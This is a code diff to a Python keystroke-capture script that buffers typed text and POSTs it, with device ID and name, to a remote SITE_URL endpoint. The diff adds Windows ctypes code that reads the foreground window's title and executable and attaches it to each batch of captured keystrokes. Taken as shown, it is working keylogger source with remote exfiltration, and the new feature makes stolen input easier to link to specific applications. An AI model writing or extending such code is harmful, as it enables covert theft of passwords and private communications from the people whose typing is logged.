@@ -4,6 +4,8 @@ import json
 import hashlib
 import platform
 import socket
+import ctypes
+from ctypes import wintypes
 from queue import Queue
 from threading import Lock, Thread
 from urllib.error import URLError, HTTPError
@@ -31,6 +33,38 @@ SHIFTED_SYMBOLS = {
 }
 
 
+def get_active_app():
+    if os.name != "nt":
+        return "Unknown app"
+
+    user32 = ctypes.windll.user32
+    hwnd = user32.GetForegroundWindow()
+    if not hwnd:
+        return "Unknown app"
+
+    title_buffer = ctypes.create_unicode_buffer(512)
+    user32.GetWindowTextW(hwnd, title_buffer, len(title_buffer))
+    title = title_buffer.value.strip()
+
+    process_id = wintypes.DWORD()
+    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(process_id))
+    kernel32 = ctypes.windll.kernel32
+    process = kernel32.OpenProcess(0x1000, False, process_id.value)
+    executable = ""
+    if process:
+        executable_buffer = ctypes.create_unicode_buffer(512)
+        executable_length = wintypes.DWORD(len(executable_buffer))
+        if kernel32.QueryFullProcessImageNameW(
+            process, 0, executable_buffer, ctypes.byref(executable_length)
+        ):
+            executable = os.path.basename(executable_buffer.value)
+        kernel32.CloseHandle(process)
+
+    if title and executable:
+        return f"{executable} - {title}"
+    return title or executable or "Unknown app"
+
+
 def normalize_key(key):
     if key in (Key.shift, Key.shift_l, Key.shift_r, Key.ctrl, Key.ctrl_l, Key.ctrl_r,
                Key.alt, Key.alt_l, Key.alt_r, Key.cmd, Key.cmd_l, Key.cmd_r):
@@ -51,7 +85,7 @@ def normalize_key(key):
     return ""
 
 
-def send_message(text):
+def send_message(text, app_name):
     try:
         headers = {"Content-Type": "application/json"}
         if API_KEY:
@@ -59,7 +93,12 @@ def send_message(text):
         request = Request(
             f"{SITE_URL}/api/messages",
             data=json.dumps(
-                {"text": text, "device_id": device_id, "device_name": device_name}
+                {
+                    "text": text,
+                    "device_id": device_id,
+                    "device_name": device_name,
+                    "app_name": app_name,
+                }
             ).encode("utf-8"),
             headers=headers,
             method="POST",
@@ -73,7 +112,8 @@ def send_message(text):
 
 def message_sender():
     while True:
-        send_message(message_queue.get())
+        text, app_name = message_queue.get()
+        send_message(text, app_name)
         message_queue.task_done()
 
 
@@ -84,7 +124,7 @@ def flush_message_buffer():
     last_key_time_ms = None
     message_started_ms = None
     if text:
-        message_queue.put(text)
+        message_queue.put((text, get_active_app()))
 
 
 def on_press(key):
